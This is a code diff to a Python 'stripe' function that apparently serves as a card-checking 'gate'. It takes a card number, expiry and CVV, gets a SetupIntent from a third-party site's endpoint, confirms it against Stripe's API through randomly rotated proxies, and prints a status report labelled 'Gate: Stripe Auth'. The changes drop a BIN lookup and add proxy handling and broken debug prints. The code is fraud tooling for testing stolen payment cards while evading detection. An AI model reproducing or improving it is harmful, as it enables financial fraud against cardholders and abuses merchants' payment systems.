@@ -13,25 +13,24 @@ def stripe(username, numero, mes, ano, cvv):
   
   #BIN CHECKER
   
-  bin = numero[:6]
   
-  binu = f'https://lookup.binlist.net/{bin}'
+
   
-  req = request.get(binu).json()
-  bank = req['bank']['name']
-  country = req['country']['name']
-  tipo1 = req['type']
-  tipo2 = req['brand']
   
-  with open(proxyies, 'r') as file:
-    proxies_1 = file.read().splitlines()
+  with open("proxy.txt", "r") as f:
+    proxy_list = [line.strip() for line in f if line.strip()]
+
+  proxy_raw = random.choice(proxy_list)
+  
     
   session = requests.Session()
-  proxie = random.choice(proxies_1)
-  
-  session.proxies = {
-    'https:' f'{proxie}'
+  proxie = {
+    "http": f"http://{proxy_raw}",
+    "https": f"http://{proxy_raw}"
   }
+
+  
+  
   
   
   url = 'https://api.switcherstudio.com/api/StripeIntents/SetupIntent'
@@ -56,11 +55,14 @@ def stripe(username, numero, mes, ano, cvv):
     'Accept-Encoding': 'gzip'
   }
   
-  decode_r = session.get(url, headers=headers).text 
+  decode_r = session.get(url, headers=headers, proxies=proxie).text 
   
   result = json.loads(decode_r)
   id = result['id']
   id2 = result['client_secret']
+
+  print(decode_r.text)
+  print(decode_r.json())
   
   url2 = 'https://api.stripe.com/v1/setup_intents/' + id + '/confirm'
   
@@ -104,7 +106,7 @@ def stripe(username, numero, mes, ano, cvv):
 
   }
   
-  final = session.post(url2, headers=h2, data=data).json()
+  final = session.post(url2, headers=h2, data=data, proxies=proxie).json()
   
   end = time.time()
   tiempo = str(inicio - end)[1:5]
@@ -146,9 +148,9 @@ def stripe(username, numero, mes, ano, cvv):
     f"⋄ ︱ Status: {msg}\n"
     f"⋄ ︱ Response: {code}\n"
     "- - - - - - - - - - - - - - -\n"
-    f"⋄ ︱ Country: {country}\n"
-    f"⋄ ︱ Bank: {bank}\n"
-    f"⋄ ︱ Type: {tipo2}|{tipo1}\n"
+    f"⋄ ︱ Country: \n"
+    f"⋄ ︱ Bank: \n"
+    f"⋄ ︱ Type: \n"
     "- - - - - - - - - - - - - - -\n"
     "⋄ ︱ Gate: Stripe Auth\n"
     f"⋄ ︱ Time: {tiempo}\n"
